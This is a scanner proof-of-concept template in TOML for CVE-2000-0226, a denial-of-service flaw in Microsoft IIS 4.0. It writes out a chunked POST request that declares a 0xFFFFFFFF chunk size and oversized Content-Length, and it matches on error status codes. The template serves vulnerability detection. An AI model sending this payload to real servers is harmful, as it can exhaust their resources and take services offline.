[info]
author = "AVE"
description = "检测 Microsoft IIS 4.0 分块传输编码缓冲区溢出拒绝服务漏洞，通过发送携带超大分块大小（0xFFFFFFFF）声明的 POST 请求但不发送实际数据，触发服务器分配大量内存等待数据，最终耗尽系统资源"
id = "POC-AVE-2000-0202"
name = "CVE-2000-0226 PoC"
severity = "medium"
tags = [
    "cve-2000-0226",
    "iis",
    "dos",
    "chunked-transfer",
]
vuln_id = [
    "CVE-2000-0226",
    "AVE-2000-0202",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
FFFFFFFF\r
"""
type = "raw"

[poc.requests.headers]
Content-Length = "999999999"
Transfer-Encoding = "chunked"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    408,
    500,
    503,
]
type = "status"
